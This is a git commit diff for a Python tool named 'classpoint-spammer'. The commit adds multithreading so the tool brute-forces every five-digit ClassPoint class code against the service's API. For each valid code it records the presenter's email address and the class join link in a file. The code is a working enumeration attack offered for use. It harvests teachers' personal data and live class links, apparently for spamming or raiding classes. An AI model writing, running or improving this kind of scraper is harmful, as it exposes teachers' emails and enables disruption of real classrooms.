7037f881560f857db18213bc9e4e54fe844c6a74
p55d2k <kai@xcidic.com>
2024-04-24 17:53:53 +0800

    v1.1.0 major changes (threading) and added checker for specific class codes

---
+++ changelog.md
@@ -0,0 +1,6 @@
+## classpoint-spammer changelog
+
+### v1.1.0 - 24/04/2024
+
+- added checker for specific codes
+- added threading
--- main.py
+++ main.py
@@ -2,20 +2,49 @@ import os
 import sys
 import time
 import requests
+import threading
 
-def print_version(extra=""):
-    print("classpoint-spammer v1.0.0" + extra)
+VERSION = "1.1.0"
+AMOUNT_THREADS = 32
+START_CODE = 10000
+END_CODE = 99999
 
 def parse_args(args):
     if args[0] == "-h":
-        print("Usage: python3 main.py [OPTIONS]\n\nOptions:\n  -h, --help\t\tShow this help message and exit\n  -o, --output\t\tOutput file name and exit\n  -v, --version\t\tShow program's version number and exit\n\nIf no options are provided, the program will run with default settings.")
+        print("""Usage: python3 main.py [OPTIONS]
+    
+Options:
+    -h, --help\t\tShow this help message and exit
+    -o, --output\tOutput file name and exit
+    -v, --version\tShow program's version number and exit
+    -t, --threads\tSet the amount of threads to use
+    [class code]\tCheck if a class code is valid and exit
+    
+If no options are provided, the program will run with default settings.""")
         sys.exit(0)
     elif args[0] == "-o" or args[0] == "--output":
         print("Output file name: /links/links_{current_datetime}.txt")
         sys.exit(0)
     elif args[0] == "-v" or args[0] == "--version":
-        print_version()
+        print(f"classpoint-spammer v{VERSION}")
         sys.exit(0)
+    elif args[0] == "-t" or args[0] == "--threads":
+        if len(args) < 2:
+            print("Invalid option. Use -h or --help for help.")
+            sys.exit(1)
+        elif args[1].isnumeric():
+            global AMOUNT_THREADS
+            AMOUNT_THREADS = min(int(args[1]), 128)
+        else:
+            print("Invalid option. Use -h or --help for help.")
+            sys.exit(1)
+    elif args[0].isnumeric():
+        if requests.get(f"https://apitwo.classpoint.app/classcode/region/byclasscode?classcode={args[0]}").status_code != 200:
+            print(f"Class code {args[0]} is invalid.")
+            sys.exit(1)
+        else:
+            print(f"Class code {args[0]} is valid.")
+            sys.exit(0)
     else:
         print("Invalid option. Use -h or --help for help.")
         sys.exit(1)
@@ -30,28 +59,42 @@ if len(sys.argv) > 1:
     parse_args(sys.argv[1:])
 
 print("\033c")
-print_version("\nSearching...\n")
+print(f"classpoint-spammer v{VERSION}\nSearching...\n")
 
 # create the file in write mode
 with open(f"links/links_{starttime}.txt", "w") as f:
     f.write("")
-
-code = 10000
-
-while code < 99999:
-    data = requests.get(f"https://apitwo.classpoint.app/classcode/region/byclasscode?classcode={code}")
+    
+def search_code(c):
+    data = requests.get(f"https://apitwo.classpoint.app/classcode/region/byclasscode?classcode={c}")
     if data.status_code != 200:
-        code += 1
-        continue
+        return
 
     resData = data.json()
 
     with open(f"links/links_{starttime}.txt", "a") as f:
-        f.write(f"Email: {resData['presenterEmail']}\nhttps://www.classpoint.app/?code={code}\n\n")
+        f.write(f"Email: {resData['presenterEmail']}\nhttps://www.classpoint.app/?code={c}\n\n")
 
-    print("Class code found: " + str(code))
+    print("Class code found: " + str(c))
     print("Link saved.\n")
+    
+def search_codes(start, end):
+    for code in range(start, end):
+        search_code(code)
 
-    code += 1
+code = START_CODE
+threads = []
+
+thread_increment = (END_CODE - START_CODE) // AMOUNT_THREADS
+
+for i in range(AMOUNT_THREADS):
+    threads.append(threading.Thread(target=search_codes, args=(code, code + thread_increment)))
+    code += thread_increment
+    
+for thread in threads:
+    thread.start()
+    
+for thread in threads:
+    thread.join()
 
 print("Search completed. Links saved to links/links_" + starttime + ".txt\n")
